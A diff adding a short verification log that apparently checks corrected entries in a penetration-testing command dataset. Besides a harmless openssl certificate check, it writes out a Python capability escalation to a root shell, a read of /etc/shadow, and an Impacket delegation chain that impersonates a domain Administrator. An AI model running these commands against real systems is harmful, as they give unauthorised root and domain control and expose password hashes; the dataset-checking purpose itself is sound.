@@ -1,0 +1,40 @@
+# Post-fix verification (2026-10-29)
+
+## fixed http-06 command from data
+openssl s_client -connect <TARGET_IP>:443 -servername <DOMAIN> </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates -ext subjectAltName
+
+## execution against local openssl s_server (127.0.0.1:8443)
+$ openssl s_client -connect 127.0.0.1:8443 -servername corp.local </dev/null 2>/dev/null | openssl x509 -noout -subject -issuer -dates
+subject=CN=corp.local
+issuer=CN=corp.local
+notBefore=Oct 29 12:38:00 2026 GMT
+notAfter=Oct 30 12:38:00 2026 GMT
+exit=0
+
+## fixed linux-privesc-08 command, bash syntax check after substituting the interpreter
+# cap_setuid on python
+python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# cap_dac_read_search
+python3 -c 'print(open("/etc/shadow").read())'
+bash-n exit=0
+
+## fixed active-directory-18 RBCD command
+impacket-addcomputer -computer-name 'FAKE$' -computer-pass '<NEW_PASSWORD>' -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+impacket-rbcd -delegate-from 'FAKE$' -delegate-to '<TARGET_COMPUTER$>' -action write -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/<USERNAME>:<PASSWORD>'
+impacket-getST -spn cifs/<TARGET_HOST> -impersonate Administrator -dc-ip <DOMAIN_CONTROLLER_IP> '<DOMAIN>/FAKE$:<NEW_PASSWORD>'
+
+## impacket-rbcd argument contract (installed tool)
+usage: rbcd.py [-h] -delegate-to DELEGATE_TO [-delegate-from DELEGATE_FROM]
+               [-action [{read,write,remove,flush}]] [-use-ldaps] [-ts]
+               [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k]
+--
+  -delegate-to DELEGATE_TO
+                        Target account the DACL is to be read/edited/etc.
+  -delegate-from DELEGATE_FROM
+--
+                        property of -delegate-to (only when using `-action
+                        write`)
+  -action [{read,write,remove,flush}]
+
+## Windows PowerShell availability (limits Get-Acl verification)
+pwsh NOT INSTALLED - windows-privesc-15 is syntax-reviewed only
